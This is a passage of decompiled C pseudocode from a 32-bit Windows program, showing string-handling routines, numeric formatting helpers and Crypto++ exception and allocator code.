// 41DA2F: variable 'v9' is possibly undefined
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (0041DA80) --------------------------------------------------------
_DWORD *__thiscall sub_41DA80(void *this, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, int a6, const void *a7)
{
  int v8; // eax
  char v10[68]; // [esp+10h] [ebp-48h] BYREF

  v8 = sub_401650(v10, 0x40u, "%p", a7);
  sub_420300((int)this, a2, a3, a4, a5, a6, v10, v8);
  return a2;
}

//----- (0041DAF0) --------------------------------------------------------
_DWORD *__thiscall sub_41DAF0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, double X)
{
  int v7; // ecx
  int v8; // eax
  int v9; // esi
  int v10; // ecx
  char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  void *v15; // ecx
  _DWORD *result; // eax
  int Y; // [esp+24h] [ebp-34h] BYREF
  int v19[4]; // [esp+28h] [ebp-30h] BYREF
  size_t v20; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[8]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v20 = 0;
  v21 = 15;
  LOBYTE(v19[0]) = 0;
  v23 = 0;
  v7 = *(_DWORD *)(a5 + 28);
  v8 = *(_DWORD *)(a5 + 20) & 0x3000;
  v9 = *(_DWORD *)(a5 + 24);
  if ( __SPAIR64__(v7, v9) <= 0 && v8 != 0x2000 )
  {
    v9 = 6;
    v7 = 0;
  }
  Y = v7;
  v10 = v9;
  if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
  {
    frexp(X, &Y);
    v10 = v9 + (int)(30103 * abs32(Y)) / 100000;
  }
  sub_419820((char *)v19, __CFADD__(v10, 50) ? -1 : v10 + 50, 0);
  v11 = sub_420CC0((int)this, v22, 76, *(_DWORD *)(a5 + 20));
  v12 = (char *)v19;
  if ( v21 >= 0x10 )
    v12 = (char *)v19[0];
  v13 = sub_401650(v12, v20, v11, v9, X);
  v14 = (char *)v19;
  if ( v21 >= 0x10 )
    v14 = (char *)v19[0];
  sub_420800((int)this, a2, a3, a4, (__int64 *)a5, a6, v14, v13);
  v23 = -1;
  if ( v21 >= 0x10 )
  {
    v15 = (void *)v19[0];
    if ( v21 + 1 >= 0x1000 )
    {
      v15 = *(void **)(v19[0] - 4);
      if ( (unsigned int)(v19[0] - (_DWORD)v15 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v15);
  }
  v20 = 0;
  result = a2;
  v21 = 15;
  LOBYTE(v19[0]) = 0;
  return result;
}
// 41DAF0: using guessed type char var_18[8];

//----- (0041DCB0) --------------------------------------------------------
_DWORD *__thiscall sub_41DCB0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, double X)
{
  int v7; // ecx
  int v8; // eax
  int v9; // esi
  int v10; // ecx
  char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  void *v15; // ecx
  _DWORD *result; // eax
  int Y; // [esp+24h] [ebp-34h] BYREF
  int v19[4]; // [esp+28h] [ebp-30h] BYREF
  size_t v20; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[8]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v20 = 0;
  v21 = 15;
  LOBYTE(v19[0]) = 0;
  v23 = 0;
  v7 = *(_DWORD *)(a5 + 28);
  v8 = *(_DWORD *)(a5 + 20) & 0x3000;
  v9 = *(_DWORD *)(a5 + 24);
  if ( __SPAIR64__(v7, v9) <= 0 && v8 != 0x2000 )
  {
    v9 = 6;
    v7 = 0;
  }
  Y = v7;
  v10 = v9;
  if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
  {
    frexp(X, &Y);
    v10 = v9 + (int)(30103 * abs32(Y)) / 100000;
  }
  sub_419820((char *)v19, __CFADD__(v10, 50) ? -1 : v10 + 50, 0);
  v11 = sub_420CC0((int)this, v22, 0, *(_DWORD *)(a5 + 20));
  v12 = (char *)v19;
  if ( v21 >= 0x10 )
    v12 = (char *)v19[0];
  v13 = sub_401650(v12, v20, v11, v9, X);
  v14 = (char *)v19;
  if ( v21 >= 0x10 )
    v14 = (char *)v19[0];
  sub_420800((int)this, a2, a3, a4, (__int64 *)a5, a6, v14, v13);
  v23 = -1;
  if ( v21 >= 0x10 )
  {
    v15 = (void *)v19[0];
    if ( v21 + 1 >= 0x1000 )
    {
      v15 = *(void **)(v19[0] - 4);
      if ( (unsigned int)(v19[0] - (_DWORD)v15 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v15);
  }
  v20 = 0;
  result = a2;
  v21 = 15;
  LOBYTE(v19[0]) = 0;
  return result;
}
// 41DCB0: using guessed type char var_18[8];

//----- (0041DE70) --------------------------------------------------------
_DWORD *__thiscall sub_41DE70(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7, int a8)
{
  char *v9; // eax
  int v10; // eax
  char v12[8]; // [esp+10h] [ebp-50h] BYREF
  char v13[68]; // [esp+18h] [ebp-48h] BYREF

  v9 = sub_420770((int)this, v12, "Lu", *(_DWORD *)(a5 + 20));
  v10 = sub_401650(v13, 0x40u, v9, a7, a8);
  sub_420300((int)this, a2, a3, a4, (__int64 *)a5, a6, v13, v10);
  return a2;
}
// 41DE70: using guessed type char var_50[8];

//----- (0041DEF0) --------------------------------------------------------
_DWORD *__thiscall sub_41DEF0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7, int a8)
{
  char *v9; // eax
  int v10; // eax
  char v12[8]; // [esp+10h] [ebp-50h] BYREF
  char v13[68]; // [esp+18h] [ebp-48h] BYREF

  v9 = sub_420770((int)this, v12, "Ld", *(_DWORD *)(a5 + 20));
  v10 = sub_401650(v13, 0x40u, v9, a7, a8);
  sub_420300((int)this, a2, a3, a4, (__int64 *)a5, a6, v13, v10);
  return a2;
}
// 41DEF0: using guessed type char var_50[8];

//----- (0041DF70) --------------------------------------------------------
_DWORD *__thiscall sub_41DF70(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7)
{
  char *v8; // eax
  int v9; // eax
  char v11[8]; // [esp+10h] [ebp-50h] BYREF
  char v12[68]; // [esp+18h] [ebp-48h] BYREF

  v8 = sub_420770((int)this, v11, "lu", *(_DWORD *)(a5 + 20));
  v9 = sub_401650(v12, 0x40u, v8, a7);
  sub_420300((int)this, a2, a3, a4, (__int64 *)a5, a6, v12, v9);
  return a2;
}
// 41DF70: using guessed type char var_50[8];

//----- (0041DFF0) --------------------------------------------------------
_DWORD *__thiscall sub_41DFF0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7)
{
  char *v8; // eax
  int v9; // eax
  char v11[8]; // [esp+10h] [ebp-50h] BYREF
  char v12[68]; // [esp+18h] [ebp-48h] BYREF

  v8 = sub_420770((int)this, v11, "ld", *(_DWORD *)(a5 + 20));
  v9 = sub_401650(v12, 0x40u, v8, a7);
  sub_420300((int)this, a2, a3, a4, (__int64 *)a5, a6, v12, v9);
  return a2;
}
// 41DFF0: using guessed type char var_50[8];

//----- (0041E070) --------------------------------------------------------
int __thiscall sub_41E070(void *this, int a2, int a3, _DWORD *a4, _DWORD *a5, unsigned __int16 a6, unsigned __int8 a7)
{
  int v7; // esi
  bool v8; // zf
  _QWORD *v9; // esi
  void (__thiscall ***v10)(_DWORD, int); // eax
  int v11; // esi
  __int64 v12; // xmm0_8
  void *v13; // ecx
  int v14; // esi
  __int64 v15; // xmm0_8
  unsigned int v16; // esi
  int v17; // esi
  int *v18; // eax
  int v19; // ecx
  _DWORD *v20; // edx
  unsigned __int16 *v21; // eax
  int *v22; // eax
  void *v23; // ecx
  int v25; // [esp-30h] [ebp-94h]
  _DWORD *v26; // [esp-2Ch] [ebp-90h]
  int v27; // [esp-28h] [ebp-8Ch]
  int v28; // [esp-20h] [ebp-84h]
  int v29; // [esp-1Ch] [ebp-80h]
  int v30[5]; // [esp+Ch] [ebp-58h] BYREF
  unsigned int v31; // [esp+20h] [ebp-44h]
  _DWORD *v32; // [esp+24h] [ebp-40h]
  int v33; // [esp+28h] [ebp-3Ch] BYREF
  int v34; // [esp+2Ch] [ebp-38h]
  int v35; // [esp+30h] [ebp-34h]
  int v36; // [esp+34h] [ebp-30h]
  int v37; // [esp+38h] [ebp-2Ch]
  __int128 v38; // [esp+3Ch] [ebp-28h] BYREF
  __int64 v39; // [esp+4Ch] [ebp-18h]
  int v40; // [esp+60h] [ebp-4h]
  int savedregs; // [esp+64h] [ebp+0h] BYREF
  _DWORD *v42; // [esp+74h] [ebp+10h]

  v35 = (int)this;
  v7 = a2;
  v37 = 0;
  v8 = (a5[5] & 0x4000) == 0;
  v32 = (_DWORD *)a2;
  v36 = a6;
  if ( !v8 )
  {
    v40 = 0;
    v34 = *(_DWORD *)(a5[12] + 4);
    (*(void (**)(void))(*(_DWORD *)v34 + 4))();
    v37 = 1;
    v9 = sub_4247B0((int)&savedregs, (int)&v33);
    v37 = 0;
    v40 = -1;
    if ( v34 )
    {
      v10 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v34 + 8))(v34);
      if ( v10 )
        (**v10)(v10, 1);
    }
    v39 = 0x700000000i64;
    LOWORD(v38) = 0;
    v40 = 1;
    if ( a7 )
    {
      LOBYTE(v40) = 2;
      v11 = (*(int (__thiscall **)(_QWORD *, int *))(*(_DWORD *)v9 + 28))(v9, v30);
      v37 = 2;
      if ( &v38 != (__int128 *)v11 )
      {
        sub_41E940(&v38);
        v38 = *(_OWORD *)v11;
        v12 = *(_QWORD *)(v11 + 16);
        *(_DWORD *)(v11 + 16) = 0;
        *(_DWORD *)(v11 + 20) = 7;
        v39 = v12;
        *(_WORD *)v11 = 0;
      }
      v37 = 2;
    }
    else
    {
      LOBYTE(v40) = 3;
      v14 = (*(int (__thiscall **)(_QWORD *, int *))(*(_DWORD *)v9 + 24))(v9, v30);
      v37 = 4;
      if ( &v38 != (__int128 *)v14 )
      {
        sub_41E940(&v38);
        v38 = *(_OWORD *)v14;
        v15 = *(_QWORD *)(v14 + 16);
        *(_DWORD *)(v14 + 16) = 0;
        *(_DWORD *)(v14 + 20) = 7;
        v39 = v15;
        *(_WORD *)v14 = 0;
      }
      v37 = 4;
    }
    v37 = 0;
    LOBYTE(v40) = 1;
    if ( v31 >= 8 )
    {
      v13 = (void *)v30[0];
      if ( 2 * v31 + 2 >= 0x1000 )
      {
        v13 = *(void **)(v30[0] - 4);
        if ( (unsigned int)(v30[0] - (_DWORD)v13 - 4) > 0x1F )
          goto LABEL_33;
      }
      sub_46C87D(v13);
    }
    v16 = a5[8];
    LOWORD(v30[0]) = 0;
    v31 = 7;
    v30[4] = 0;
    if ( __SPAIR64__(a5[9], v16) <= 0 || v16 <= (unsigned int)v39 )
      v17 = 0;
    else
      v17 = v16 - v39;
    if ( (a5[5] & 0x1C0) == 64 )
    {
      v20 = a4;
      v19 = a3;
    }
    else
    {
      v18 = sub_4201F0(v35, &v33, a3, a4, v36, v17);
      v17 = 0;
      v19 = *v18;
      v20 = (_DWORD *)v18[1];
    }
    v21 = (unsigned __int16 *)&v38;
    if ( HIDWORD(v39) >= 8 )
      v21 = (unsigned __int16 *)v38;
    v22 = sub_420270(v35, &v33, v19, v20, v21, v39);
    v29 = v17;
    v28 = v36;
    v7 = (int)v32;
    v27 = *v22;
    v26 = v32;
    v25 = v35;
    v42 = (_DWORD *)v22[1];
    a5[8] = 0;
    a5[9] = 0;
    sub_4201F0(v25, v26, v27, v42, v28, v29);
    v40 = -1;
    if ( HIDWORD(v39) < 8 )
      goto LABEL_31;
    v23 = (void *)v38;
    if ( (unsigned int)(2 * HIDWORD(v39) + 2) < 0x1000
      || (v23 = *(void **)(v38 - 4), (unsigned int)(v38 - (_DWORD)v23 - 4) <= 0x1F) )
    {
      sub_46C87D(v23);
LABEL_31:
      v39 = 0x700000000i64;
      LOWORD(v38) = 0;
      return v7;
    }
LABEL_33:
    _invalid_parameter_noinfo_noreturn();
  }
  (*(void (__thiscall **)(void *, int, int, _DWORD *, _DWORD *, int, _DWORD))(*(_DWORD *)this + 36))(
    this,
    a2,
    a3,
    a4,
    a5,
    v36,
    a7);
  return v7;
}

//----- (0041E390) --------------------------------------------------------
int __cdecl sub_41E390(int a1)
{
  char *v1; // esi
  int v2; // eax
  void *v3; // ecx
  void *v4; // ecx
  void *v5; // ecx
  int result; // eax
  int v7[5]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v8; // [esp+20h] [ebp-48h]
  int v9[5]; // [esp+24h] [ebp-44h] BYREF
  unsigned int v10; // [esp+38h] [ebp-30h]
  int v11; // [esp+3Ch] [ebp-2Ch]
  void *v12[4]; // [esp+40h] [ebp-28h] BYREF
  int v13; // [esp+50h] [ebp-18h]
  unsigned int v14; // [esp+54h] [ebp-14h]
  int v15; // [esp+58h] [ebp-10h]
  int v16; // [esp+64h] [ebp-4h]

  v11 = a1;
  v15 = 0;
  v1 = (char *)sub_420D80((int)v7);
  v16 = 1;
  v13 = 0;
  v14 = 15;
  LOBYTE(v12[0]) = 0;
  sub_41EF80(v12, "RSA", 3u);
  LOBYTE(v16) = 2;
  v2 = sub_421F20((int)v9, (char *)v12, "/");
  LOBYTE(v16) = 3;
  sub_4220E0(a1, v2, v1);
  v15 = 1;
  LOBYTE(v16) = 2;
  if ( v10 >= 0x10 )
  {
    v3 = (void *)v9[0];
    if ( v10 + 1 >= 0x1000 )
    {
      v3 = *(void **)(v9[0] - 4);
      if ( (unsigned int)(v9[0] - (_DWORD)v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v3);
  }
  v9[4] = 0;
  v10 = 15;
  LOBYTE(v9[0]) = 0;
  LOBYTE(v16) = 1;
  if ( v14 >= 0x10 )
  {
    v4 = v12[0];
    if ( v14 + 1 >= 0x1000 )
    {
      v4 = (void *)*((_DWORD *)v12[0] - 1);
      if ( (unsigned int)(v12[0] - v4 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v4);
  }
  v13 = 0;
  v14 = 15;
  LOBYTE(v12[0]) = 0;
  LOBYTE(v16) = 0;
  if ( v8 >= 0x10 )
  {
    v5 = (void *)v7[0];
    if ( v8 + 1 >= 0x1000 )
    {
      v5 = *(void **)(v7[0] - 4);
      if ( (unsigned int)(v7[0] - (_DWORD)v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v5);
  }
  v7[4] = 0;
  result = a1;
  v8 = 15;
  LOBYTE(v7[0]) = 0;
  return result;
}

//----- (0041E530) --------------------------------------------------------
unsigned int __thiscall sub_41E530(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  unsigned int v3; // eax
  unsigned int v4; // esi
  unsigned int v5; // edx
  void *v6; // ebx
  char v8[4]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-1Ch]
  unsigned int v10; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v12; // [esp+30h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 4))(v1, v8);
  v12 = 0;
  v3 = sub_440BD0(v2);
  if ( v3 <= 1 )
    v4 = 0;
  else
    v4 = v3 - 1;
  v12 = -1;
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 41E530: using guessed type char var_24[4];

//----- (0041E5D0) --------------------------------------------------------
_BYTE *__thiscall sub_41E5D0(_BYTE *this, int *a2)
{
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int *v6; // ecx

  *(_DWORD *)this = a2;
  v3 = *(int *)((char *)a2 + *(_DWORD *)(*a2 + 4) + 56);
  if ( v3 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v4 = *a2;
  v5 = *(_DWORD *)(*a2 + 4);
  if ( !*(int *)((char *)a2 + v5 + 12) )
  {
    v6 = *(int **)((char *)a2 + v5 + 60);
    if ( v6 )
    {
      if ( v6 != a2 )
      {
        sub_4212B0();
        v4 = *a2;
      }
    }
  }
  this[4] = *(int *)((char *)a2 + *(_DWORD *)(v4 + 4) + 12) == 0;
  return this;
}

//----- (0041E690) --------------------------------------------------------
char *__thiscall sub_41E690(char *this)
{
  void *v2; // ecx
  void *v4[4]; // [esp+14h] [ebp-24h] BYREF
  int v5; // [esp+24h] [ebp-14h]
  unsigned int v6; // [esp+28h] [ebp-10h]
  int v7; // [esp+34h] [ebp-4h]

  v5 = 0;
  v6 = 15;
  LOBYTE(v4[0]) = 0;
  sub_41EF80(v4, "BufferedTransformation: this object doesn't allow input", 0x37u);
  v7 = 0;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v7) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 0;
  sub_419BE0((_DWORD *)this + 4, v4);
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  LOBYTE(v7) = 5;
  if ( v6 >= 0x10 )
  {
    v2 = v4[0];
    if ( v6 + 1 >= 0x1000 )
    {
      v2 = (void *)*((_DWORD *)v4[0] - 1);
      if ( (unsigned int)(v4[0] - v2 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v2);
  }
  v5 = 0;
  v6 = 15;
  LOBYTE(v4[0]) = 0;
  *(_DWORD *)this = &CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';
  v7 = -1;
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 4BABD0: using guessed type void *CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';

//----- (0041E7A0) --------------------------------------------------------
int __stdcall sub_41E7A0(unsigned int a1, int a2)
{
  int result; // eax
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v4[9]; // [esp+2Ch] [ebp-24h] BYREF

  result = a1;
  if ( a1 > 0x3FFFFFFF )
  {
    sub_419B80((int)v4, "AllocatorBase: requested size would cause integer overflow");
    v4[8] = 0;
    sub_405230(pExceptionObject, v4);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( a1 )
    return sub_45AC10(4 * a1);
  return result;
}

//----- (0041E830) --------------------------------------------------------
char *__thiscall sub_41E830(char *this)
{
  void *v2; // ecx
  void *v4[4]; // [esp+14h] [ebp-24h] BYREF
  int v5; // [esp+24h] [ebp-14h]
  unsigned int v6; // [esp+28h] [ebp-10h]
  int v7; // [esp+34h] [ebp-4h]

  v5 = 0;
  v6 = 15;
  LOBYTE(v4[0]) = 0;
  sub_41EF80(v4, "BufferedTransformation: this object doesn't allow input", 0x37u);
  v7 = 0;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v7) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 0;
  sub_419BE0((_DWORD *)this + 4, v4);
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  LOBYTE(v7) = 5;
  if ( v6 >= 0x10 )
  {
    v2 = v4[0];
    if ( v6 + 1 >= 0x1000 )
    {
      v2 = (void *)*((_DWORD *)v4[0] - 1);
      if ( (unsigned int)(v4[0] - v2 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v2);
  }
  v5 = 0;
  v6 = 15;
  LOBYTE(v4[0]) = 0;
  *(_DWORD *)this = &CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';
  v7 = -1;
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 4B8954: using guessed type void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';

//----- (0041E940) --------------------------------------------------------
int __thiscall sub_41E940(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  v2 = this[5];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)*this;
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[4] = 0;
  result = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (0041E9A0) --------------------------------------------------------
_DWORD *__thiscall sub_41E9A0(_DWORD *this, unsigned int a2, unsigned __int16 a3)
{
  unsigned int v4; // ecx
  char *v5; // edx
  char *v6; // edi
  int j; // ecx
  unsigned int v9; // edi
  unsigned int v10; // edx
  unsigned int v11; // ecx
  unsigned int v12; // edx
  size_t v13; // eax
  void *v14; // eax
  _DWORD *v15; // edx
  unsigned __int16 *v16; // edi
  int i; // ecx
  void *v18; // eax
  unsigned int v19; // [esp+Ch] [ebp-8h]
  _DWORD *v20; // [esp+10h] [ebp-4h]
  _DWORD *v21; // [esp+10h] [ebp-4h]

  v4 = this[5];
  v19 = v4;
  if ( a2 > v4 )
  {
    if ( a2 > 0x7FFFFFFE )
      sub_4257D0();
    v9 = a2 | 7;
    if ( (a2 | 7) <= 0x7FFFFFFE )
    {
      v10 = v4 >> 1;
      if ( v4 <= 2147483646 - (v4 >> 1) )
      {
        if ( v9 < v10 + v4 )
          v9 = v10 + v4;
      }
      else
      {
        v9 = 2147483646;
      }
    }
    else
    {
      v9 = 2147483646;
    }
    v11 = __CFADD__(v9, 1) ? -1 : v9 + 1;
    v12 = 2 * v11;
    if ( v11 <= 0x7FFFFFFF )
    {
      if ( v12 < 0x1000 )
      {
        if ( v12 )
          v15 = operator new(2 * v11);
        else
          v15 = 0;
        goto LABEL_26;
      }
    }
    else
    {
      v12 = -1;
    }
    v13 = v12 + 35;
    if ( v12 + 35 <= v12 )
      v13 = -1;
    v14 = operator new(v13);
    if ( !v14 )
      goto LABEL_36;
    v15 = (_DWORD *)(((unsigned int)v14 + 35) & 0xFFFFFFE0);
    *(v15 - 1) = v14;
LABEL_26:
    v21 = v15;
    this[4] = a2;
    this[5] = v9;
    if ( a2 )
    {
      memset32(v15, (a3 << 16) | a3, a2 >> 1);
      v16 = (unsigned __int16 *)&v15[a2 >> 1];
      for ( i = a2 & 1; i; --i )
        *v16++ = a3;
    }
    *((_WORD *)v15 + a2) = 0;
    if ( v19 < 8 )
      goto LABEL_35;
    v18 = (void *)*this;
    if ( 2 * v19 + 2 < 0x1000 )
    {
LABEL_34:
      sub_46C87D(v18);
LABEL_35:
      *this = v21;
      return this;
    }
    if ( (unsigned int)v18 - *((_DWORD *)v18 - 1) - 4 <= 0x1F )
    {
      v18 = (void *)*((_DWORD *)v18 - 1);
      goto LABEL_34;
    }
LABEL_36:
    _invalid_parameter_noinfo_noreturn();
  }
  v20 = this;
  v5 = (char *)this;
  if ( v4 >= 8 )
  {
    v5 = (char *)*this;
    v20 = (_DWORD *)*this;
  }
  this[4] = a2;
  if ( a2 )
  {
    memset32(v5, (a3 << 16) | a3, a2 >> 1);
    v6 = &v5[4 * (a2 >> 1)];
    for ( j = a2 & 1; j; --j )
    {
      *(_WORD *)v6 = a3;
      v6 += 2;
    }
  }
  *((_WORD *)v20 + a2) = 0;
  return this;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0041EB20) --------------------------------------------------------
void **__thiscall sub_41EB20(void **this, void *a2, unsigned int a3)
{
  unsigned int v4; // ecx
  void *v5; // ebx
  unsigned int v7; // esi
  unsigned int v8; // edx
  unsigned int v9; // ecx
  unsigned int v10; // edx
  size_t v11; // eax
  void *v12; // eax
  _DWORD *v13; // ebx
  void *v14; // eax
  unsigned int v15; // [esp+Ch] [ebp-Ch]

  v4 = (unsigned int)this[5];
  v15 = v4;
  if ( a3 > v4 )
  {
    if ( a3 > 0x7FFFFFFE )
      sub_4257D0();
    v7 = a3 | 7;
    if ( (a3 | 7) <= 0x7FFFFFFE )
    {
      v8 = v4 >> 1;
      if ( v4 <= 2147483646 - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 2147483646;
      }
    }
    else
    {
      v7 = 2147483646;
    }
    v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
    v10 = 2 * v9;
    if ( v9 <= 0x7FFFFFFF )
    {
      if ( v10 < 0x1000 )
      {
        if ( v10 )
          v13 = operator new(2 * v9);
        else
          v13 = 0;
        goto LABEL_22;
      }
    }
    else
    {
      v10 = -1;
    }
    v11 = v10 + 35;
    if ( v10 + 35 <= v10 )
      v11 = -1;
    v12 = operator new(v11);
    if ( !v12 )
      goto LABEL_28;
    v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
    *(v13 - 1) = v12;
LABEL_22:
    this[5] = (void *)v7;
    this[4] = (void *)a3;
    memmove(v13, a2, 2 * a3);
    *((_WORD *)v13 + a3) = 0;
    if ( v15 < 8 )
    {
LABEL_27:
      *this = v13;
      return this;
    }
    v14 = *this;
    if ( 2 * v15 + 2 < 0x1000 )
    {
LABEL_26:
      sub_46C87D(v14);
      goto LABEL_27;
    }
    if ( (unsigned int)v14 - *((_DWORD *)v14 - 1) - 4 <= 0x1F )
    {
      v14 = (void *)*((_DWORD *)v14 - 1);
      goto LABEL_26;
    }
LABEL_28:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 8 )
    v5 = *this;
  this[4] = (void *)a3;
  memmove_0(v5, a2, 2 * a3);
  *((_WORD *)v5 + a3) = 0;
  return this;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0041EC80) --------------------------------------------------------
void __thiscall sub_41EC80(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  v2 = this[5];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)*this;
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
}

//----- (0041ECD0) --------------------------------------------------------
void __thiscall sub_41ECD0(void **this)
{
  _DWORD *v2; // esi

  v2 = *this;
  memmove(this, *this, (size_t)this[4] + 1);
  if ( (unsigned int)this[5] + 1 >= 0x1000 )
  {
    if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (_DWORD *)*(v2 - 1);
  }
  sub_46C87D(v2);
  this[5] = (void *)15;
}

//----- (0041ED20) --------------------------------------------------------
unsigned __int8 __thiscall sub_41ED20(void **this, char a2)
{
  char *v2; // edx
  bool v3; // cf
  unsigned __int8 result; // al
  int v5; // [esp+0h] [ebp-4h]

  v5 = (int)this;
  v2 = (char *)this[4];
  if ( v2 >= this[5] )
  {
    LOBYTE(v5) = 0;
    return (unsigned __int8)sub_424B40(this, (int)this, v5, a2);
  }
  else
  {
    v3 = (unsigned int)this[5] < 0x10;
    this[4] = v2 + 1;
    if ( !v3 )
      this = (void **)*this;
    result = a2;
    v2[(_DWORD)this] = a2;
    v2[(_DWORD)this + 1] = 0;
  }
  return result;
}

//----- (0041ED70) --------------------------------------------------------
const void **__thiscall sub_41ED70(char *this, unsigned int a2, char *Src, unsigned int a4)
{
  size_t v4; // edx
  unsigned int v6; // ecx
  unsigned int v7; // ebx
  char *v9; // eax
  unsigned int v10; // ebx
  size_t v11; // ebx
  char *v13; // [esp+1Ch] [ebp+10h]

  v4 = a2;
  v6 = *((_DWORD *)this + 4);
  if ( v6 < a2 )
    sub_421040();
  v7 = *((_DWORD *)this + 5);
  if ( a4 > v7 - v6 )
  {
    LOBYTE(a2) = 0;
    return sub_424C80((const void **)this, a4, a2, v4, Src, a4);
  }
  else
  {
    v13 = this;
    *((_DWORD *)this + 4) = v6 + a4;
    v9 = this;
    if ( v7 >= 0x10 )
    {
      v9 = *(char **)this;
      v13 = *(char **)this;
    }
    v10 = (unsigned int)&v9[a2];
    if ( &Src[a4] <= &v9[a2] || Src > &v13[v6] )
    {
      v11 = a4;
    }
    else if ( v10 > (unsigned int)Src )
    {
      v11 = v10 - (_DWORD)Src;
    }
    else
    {
      v11 = 0;
    }
    memmove_0(&v13[a2 + a4], &v13[a2], v6 - a2 + 1);
    memmove(&v13[a2], Src, v11);
    memmove(&v13[a2 + v11], &Src[v11 + a4], a4 - v11);
    return (const void **)this;
  }
}
// 421040: using guessed type void __noreturn sub_421040(void);

//----- (0041EE40) --------------------------------------------------------
void **__thiscall sub_41EE40(void **this, size_t Size, char a3)
{
